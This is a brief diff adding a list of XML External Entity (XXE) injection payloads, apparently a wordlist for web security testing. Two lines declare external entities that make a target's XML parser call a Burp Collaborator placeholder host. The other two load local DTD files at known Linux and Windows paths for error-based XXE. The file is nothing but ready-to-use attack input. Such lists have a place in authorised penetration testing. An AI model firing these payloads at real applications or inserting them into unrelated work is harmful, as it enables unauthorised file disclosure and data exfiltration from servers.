@@ -1,0 +1,5 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "PROTOCOL://MYSUBDOMAIN.burpcollaborator.net"> ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "PROTOCOL://MYSUBDOMAIN.burpcollaborator.net"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
+<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"> %local_dtd; ]>
+
